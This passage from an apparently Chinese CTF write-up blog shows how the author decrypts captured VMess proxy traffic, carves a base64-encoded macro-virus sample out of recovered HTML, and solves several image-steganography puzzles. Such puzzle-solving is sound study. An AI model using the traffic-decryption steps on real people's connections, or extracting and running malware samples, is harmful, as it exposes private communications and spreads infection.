class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;port     = <span class="subst">&#123;bytes_to_long(ret[<span class="number">38</span>:<span class="number">40</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;type     = <span class="subst">&#123;ret[<span class="number">40</span>:<span class="number">41</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>) <span class="comment">#ipv4</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;host     = <span class="subst">&#123;<span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ret[<span class="number">41</span>:<span class="number">45</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;rand     = <span class="subst">&#123;ret[<span class="number">45</span>:<span class="number">45</span> + p].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;F        = 0x<span class="subst">&#123;ret[<span class="number">45</span> + p:<span class="number">45</span> + p + <span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;check    = <span class="subst">&#123;<span class="built_in">hex</span>(fnv1a_32(ret[:<span class="number">45</span> + p]))&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出得到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ver      = 01</span><br><span class="line">dat_iv   = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">dat_key  = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 1101</span><br><span class="line">p        = 6</span><br><span class="line">sec      = 3</span><br><span class="line"></span><br><span class="line">cmd      = 01</span><br><span class="line">port     = 5000</span><br><span class="line">type     = 01</span><br><span class="line"></span><br><span class="line">host     = 127.0.0.1</span><br><span class="line">rand     = 1ace7d9bb0b5</span><br><span class="line">F        = 0x39182c03</span><br><span class="line">check    = 0x39182c03</span><br></pre></td></tr></table></figure>
<h3 id="根据协议协定信息进行解密">根据协议协定信息进行解密</h3>
<p>切分后得到的协议信息，比较关键的部分主要在<code>dat_iv</code>、<code>dat_key</code>、<code>opt</code>以及<code>sec</code>中。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423161747894.png" class="" title="image-20230423161747894">
<p>但通过文档发现<code>Opt</code>略显不对，主要因为文档年久失修:)</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.go">v2ray-core/headers.go at 5dffca84234a74da9e8174f1e0b0af3dfb2a58ce · v2ray/v2ray-core (github.com)</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423162307956.png" class="" title="image-20230423162307956">
<p>所以<code>Opt</code>部分，主要开启了<code>GlobalPadding</code>、<code>ChunkMasking</code>以及<code>ChunkStream</code>，所以我们得到信息，元数据开启了数据混淆，所以我们客户端和服务端分别需要构造两个<code>Shake</code>实例。并且解密的时候注意<code>Padding</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163010237.png" class="" title="image-20230423163010237">
<p>而<code>sec</code>部分，也不出意外的年久失修了:)</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.proto">https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.proto</a></p>
</blockquote>
<p><code>sec=3</code>的情况下，我们应该选择<code>AES-128-GCM</code>进行解密。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421135041930.png" class="" title="image-20230421135041930">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163043222.png" class="" title="image-20230423163043222">
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHAKE128</span><br><span class="line"><span class="comment"># 协议初始定义中体现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SizeParser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nonce</span>):</span><br><span class="line">        self.shake = SHAKE128.new(nonce)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(self.shake.read(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_padding</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() % <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">arr, key, iv</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    parser = SizeParser(iv)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(arr) &gt; <span class="number">0</span>:</span><br><span class="line">        padding = parser.next_padding()</span><br><span class="line">        L = parser.dec(bytes_to_long(arr[:<span class="number">2</span>])) - padding</span><br><span class="line"></span><br><span class="line">        arr = arr[<span class="number">2</span>:]</span><br><span class="line">        e_iv = p64(count, endian=<span class="string">&#x27;big&#x27;</span>)[<span class="number">6</span>:] + iv[<span class="number">2</span>:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            dec = AES.new(key, AES.MODE_GCM, e_iv).decrypt_and_verify(arr[:L-<span class="number">16</span>], arr[L-<span class="number">16</span>:L])</span><br><span class="line">            output.append(dec)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[!] Decryption failed!&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            arr = arr[L + padding:]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">data = cmd[<span class="number">45</span> + p + <span class="number">4</span>:]</span><br><span class="line">data_iv = ret[<span class="number">1</span>:<span class="number">17</span>]</span><br><span class="line">data_key = ret[<span class="number">17</span>:<span class="number">33</span>]</span><br><span class="line"><span class="comment"># print(type(data_key))</span></span><br><span class="line">pprint(decrypt(data, data_key, data_iv)[<span class="number">0</span>].decode().split(<span class="string">&#x27;\r\n&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>得到输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dat_iv   = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">dat_key  = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">[&#x27;GET /out HTTP/1.1&#x27;,</span><br><span class="line"> &#x27;Host: 127.0.0.1:5000&#x27;,</span><br><span class="line"> &#x27;User-Agent: curl/7.75.0&#x27;,</span><br><span class="line"> &#x27;Accept: */*&#x27;,</span><br><span class="line"> &#x27;Connection: close&#x27;,</span><br><span class="line"> &#x27;&#x27;,</span><br><span class="line"> &#x27;&#x27;]</span><br></pre></td></tr></table></figure>
<h3 id="将所有响应数据进行解密">将所有响应数据进行解密</h3>
<p><strong>插播，前面都是请求数据，本部分为响应数据。</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163848309.png" class="" title="image-20230423163848309">
<p>响应数据依旧使用<code>AES-128-CFB</code>进行解密。</p>
<p>响应数据我们如何得到？直接利用<code>Wireshark</code>追踪数据流功能进行查看。先转换成原始数据，再把所有蓝色数据导出即可。保存为<code>res.bytes</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423164122895.png" class="" title="image-20230423164122895">
<p>依旧根据协议定义对解密后的数据进行切分提取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="built_in">open</span>(<span class="string">&#x27;res.bytes&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">res_key = md5(data_key)</span><br><span class="line">res_iv = md5(data_iv)</span><br><span class="line"><span class="comment"># print(res_key)</span></span><br><span class="line"><span class="comment"># print(res_iv)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_key  = <span class="subst">&#123;res_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_iv   = <span class="subst">&#123;res_iv&#125;</span>&quot;</span>)</span><br><span class="line">res_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(res_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(res_iv), segment_size=<span class="number">128</span>)</span><br><span class="line">dec_res = res_aes().decrypt(res[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;dec_res[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;dec_res[<span class="number">1</span>:<span class="number">2</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">2</span>:<span class="number">3</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c_l      = <span class="subst">&#123;dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">cmd_len = <span class="built_in">int</span>(dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">4</span>:<span class="number">4</span>+cmd_len].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">data = res[<span class="number">4</span> + cmd_len:]</span><br><span class="line">plaintext = decrypt(data, <span class="built_in">bytes</span>.fromhex(res_key), <span class="built_in">bytes</span>.fromhex(res_iv))</span><br></pre></td></tr></table></figure>
<p>输出得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res_key  = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">res_iv   = fa2a8ab0fadb4854943df690335a99b5</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 00</span><br><span class="line">cmd      = 00</span><br><span class="line">c_l      = 00</span><br><span class="line">cmd      = </span><br><span class="line">dat_iv   = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">dat_key  = fa2a8ab0fadb4854943df690335a99b5</span><br></pre></td></tr></table></figure>
<h3 id="解密之后所得文件">解密之后所得文件</h3>
<p>解密所得文件为一个 html 文件，其中以 base64 编码存放有一份宏病毒。因此这里取出其内容，实测电脑中的杀毒软件对此病毒十分敏感，一旦落入文件系统文件立刻会被损坏，最后为了查看内容直接存储为 zip 文件解压后查看。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(i.decode() <span class="keyword">for</span> i <span class="keyword">in</span> plaintext)</span><br><span class="line">start = data.find(<span class="string">&quot;atob(&#x27;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;atob(&#x27;&quot;</span>)</span><br><span class="line">end = data.find(<span class="string">&quot;&#x27;);&quot;</span>, start)</span><br><span class="line"></span><br><span class="line">binary = b64decode(data[start:end])</span><br><span class="line">check_sum = hashlib.sha256(binary).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;doc.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(binary)</span><br></pre></td></tr></table></figure>
<p><em>这一步，如此如此这般这般就得到html文件，并且为宏病毒文件。暂且缘由不太理解，先放着。</em></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421105016271.png" class="" title="image-20230421105016271">
<h3 id="利用病毒sha256值反向查找">利用病毒sha256值反向查找</h3>
<p>把zip文件直接放<code>foremost</code>分析一下，能够得到病毒的dll。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sha256sum 00000277.dll</span><br><span class="line">0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1  00000277.dll</span><br></pre></td></tr></table></figure>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423172325054.png" class="" title="image-20230423172325054">
<p>检索得到：<a href="https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919">Malware analysis extracted_at_0x22a7b.exe Malicious activity | ANY.RUN - Malware Sandbox Online</a></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421150620900.png" class="" title="image-20230421150620900">
<p>得到api的<code>url</code>为<code>http://api.ipify.org</code></p>
<p>md5得到压缩密码为<code>08229f4052dde89671134f1784bed2d6</code></p>
<p>得到<code>flag</code>文件。</p>
<h2 id="go文件">go文件</h2>
<p>得到的文件使用<code>WINHEX</code>打开一下，发现提示了文件类型，是<code>Gob</code>文件</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421151511429.png" class="" title="image-20230421151511429">
<p>利用属性来进行定义，从而反序列化。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421152349138.png" class="" title="image-20230421152349138">
<p>导包的时候出现了<code>missing path</code>，找了报错原因，没解决，后来发现是因为格式错了。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><em>然后脚本的原理暂且还不太理解，先放着。</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//seed init</span></span><br><span class="line">	loc, _ := time.LoadLocation(<span class="string">&quot;Local&quot;</span>)</span><br><span class="line">	timeObj, _ := time.ParseInLocation(</span><br><span class="line">		<span class="string">&quot;2006-01-02 15:04:05&quot;</span>,</span><br><span class="line">		<span class="string">&quot;2022-07-19 14:49:56&quot;</span>, loc)</span><br><span class="line">	seed := timeObj.Unix()</span><br><span class="line">	rand.Seed(seed)</span><br><span class="line"></span><br><span class="line">	input, _ := os.Open(<span class="string">&quot;./src.png&quot;</span>)</span><br><span class="line">	in := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">70475</span>)</span><br><span class="line">	lenx, _ := input.Read(in)</span><br><span class="line">	table := <span class="built_in">make</span>([]<span class="type">int</span>, lenx)</span><br><span class="line">	out := <span class="built_in">make</span>([]<span class="type">byte</span>, lenx)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		table[i] = i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shuffle</span></span><br><span class="line">	rand.Shuffle(<span class="built_in">len</span>(table), <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		table[i], table[j] = table[j], table[i]</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		out[table[i]] = in[i]</span><br><span class="line">	&#125;</span><br><span class="line">	output, _ := os.Create(<span class="string">&quot;./flag.png&quot;</span>)</span><br><span class="line">	output.Write(out)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到图片。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/flag.png" class="" title="flag">
<h2 id="图片隐写">图片隐写</h2>
<p><em>搞出一张图片了，但没明白为啥图片的大小就是<code>70450bytes</code>，有点迷惑。</em></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421155213728.png" class="" title="image-20230421155213728">
<p>没找到合适的工具提取隐写，十有八九是提取像素点的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">arr = np.array(img)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">bytes</span>(arr[:, :, <span class="number">3</span>].reshape(<span class="number">2000</span> * <span class="number">973</span>)).replace(<span class="string">b&#x27;\xff&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).decode()[:<span class="number">42</span>]</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment"># flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from PIL import Image</span></span><br><span class="line"><span class="comment"># pic = Image.open(&#x27;flag.png&#x27;)</span></span><br><span class="line"><span class="comment"># w, h = pic.size</span></span><br><span class="line"><span class="comment"># flag = []</span></span><br><span class="line"><span class="comment"># for i in range(h):</span></span><br><span class="line"><span class="comment">#     for j in range(w):</span></span><br><span class="line"><span class="comment">#         piexl = list(pic.getpixel((j, i)))[3]</span></span><br><span class="line"><span class="comment">#         if(piexl != 0xff):</span></span><br><span class="line"><span class="comment">#             flag.append(chr(int(piexl)))</span></span><br><span class="line"><span class="comment">#             if len(flag) == 42:</span></span><br><span class="line"><span class="comment">#                 print(&#x27;&#x27;.join(flag))</span></span><br></pre></td></tr></table></figure>
<p>最后得到<code>flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</code></p>
<h1>[qwb-2021]threebody</h1>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/244533">用图片讲一个故事——第五届强网杯Threebody题目官方题解-安全客 - 安全资讯平台 (anquanke.com)</a></p>
</blockquote>
<h2 id="stegsolve查看发现图片">stegsolve查看发现图片</h2>
<p>你们都是虫子。</p>
<h2 id="放大发现像素点数">放大发现像素点数</h2>
<p>相邻像素点数值相差较大。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230308100114529.png" class="" title="image-20230308100114529">
<p>仔细观察发现如果以4为周期相差像素点数值将相差不大。 -&gt; 修改像素点所占比特数<code>biBitCount 24 -&gt; 32</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230308094743609.png" class="" title="image-20230308094743609">
<p>得到真实图片。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/threebody_output.bmp" class="" title="true threebody">
<h2 id="再使用solvesolve进行分析">再使用solvesolve进行分析</h2>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230215130857823.png" class="">
<p><code>stegsolve</code>进行提取。行列都存在隐写数据。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/steg1.png" class="" title="row">
<img src="/2023/03/09/MISC-Write-Up-zh/steg2.png" class="">
<p>可得提示<code>希尔伯特曲线</code></p>
<h2 id="冗余数据赋值">冗余数据赋值</h2>
<p>观察图片发现存在<code>rgbReserved</code>的字段，表示<code>stegsolve</code>还存在无法识别的通道。</p>
<p>两种方法。</p>
<ul>
<li><code>bmp</code>转化成<code>png</code></li>
<li><code>blue</code>通道跟<code>Reserved</code>通道大小相近，直接暴力赋值</li>
</ul>
<h3 id="bmp转化成png">bmp转化成png</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image=Image.new(mode=<span class="string">&#x27;RGBA&#x27;</span>,size=(<span class="number">580</span>,<span class="number">435</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;threebody.bmp&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file=f.read()</span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">434</span>,-<span class="number">1</span>,-<span class="number">1</span>):  <span class="comment">#根据bmp的结构知道该bmp文件上下倒序存储像素值</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">580</span>):</span><br><span class="line">            s=[]</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">                s.append(file[index])</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">            image.putpixel((j,i),(s[<span class="number">2</span>],s[<span class="number">1</span>],s[<span class="number">0</span>],s[<span class="number">3</span>]))  <span class="comment">#</span></span><br><span class="line">    image.show()</span><br><span class="line">    image.save(<span class="string">&#x27;threebody_new.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="暴力赋值">暴力赋值</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody.bmp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.read()</span><br><span class="line"></span><br><span class="line">w = <span class="number">580</span></span><br><span class="line">h = <span class="number">435</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line">l = <span class="built_in">bytearray</span>(d)</span><br><span class="line">off = l[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        l[off+j*b+i*b*w] = l[off+j*b+i*b*w+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody_new.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(l)</span><br></pre></td></tr></table></figure>
<h2 id="希尔伯特曲线">希尔伯特曲线</h2>
<blockquote>
<p>reference: <a href="https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg">真·降维打击！《三体》中二向箔吞噬地球的场景成真了！这位B站Up主过于硬核… (qq.com)</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#安装：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple hilbertcurve</span></span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="comment">#提取像素数据</span></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(<span class="string">&#x27;threebody_new.png&#x27;</span>) <span class="keyword">as</span> img:</span><br><span class="line">    arr = np.asarray(img)</span><br><span class="line">arr = np.vectorize(<span class="keyword">lambda</span> x: x&amp;<span class="number">1</span>)(arr[:,:,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#确定图片中的有效区域</span></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">0</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">0</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">1</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">1</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#剪切出有效二维数据</span></span><br><span class="line">arr = arr[x1:x2+<span class="number">1</span>, y1:y2+<span class="number">1</span>]</span><br><span class="line"><span class="comment">#print(x2+1-x1)#得出是128*128的矩阵</span></span><br><span class="line"><span class="comment">#构建希尔伯特曲线对象</span></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">7</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#生成一维的二进制流数据</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x,y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += <span class="built_in">str</span>(arr[<span class="number">127</span>-y][x])</span><br><span class="line"><span class="comment">#转ASCII文本写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">int</span>(s,<span class="number">2</span>).to_bytes(<span class="number">2048</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><em>但这个一直没能实现，不清楚是不是没剪切图片的原因。</em></p>
<p><em><strong>0228，笑死，真的是因为没剪切的原因。</strong></em></p>
<h2 id="C语言编译">C语言编译</h2>
<p>打开<code>output.txt</code>发现是C语言脚本，所以用VSCode进行编译运行，发现打印的是自身。</p>
<blockquote>
<p>出题人的知识点：</p>
<p>这种可以打印自身的程序学名叫Quine</p>
</blockquote>
<p>即使看似是相同的文件，可能存在某种差异，直接用<code>BCompare4</code>对原始文件以及输出文件进行对比，发现在文件的第11行存在差别。</p>
<p>原始文件存在<code>Tab</code>以及<code>Space</code>，转化成<code>01</code>数据流。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230228110003750.png" class="" title="image-20230228110003750">
<p>用<code>Notepad++</code>得到<code>01</code>数据流。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span><br></pre></td></tr></table></figure>
<h2 id="数据处理">数据处理</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output = <span class="string">&#x27;2009092020090920200909200909202020090920202020092009092020090909200909090920090920092020200920202020090920202009200909200909200920092020200920092009092009090920202009092009200920090920092020092020090920202020200909200909092020092020202020092009092009092020200920090909090920092009202020202009090920200920202009092020202020200909200909202020090920202009200909202009200920090920090920092009090909092009&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">output = output.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line"><span class="comment"># 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>, output)</span><br><span class="line">flag = <span 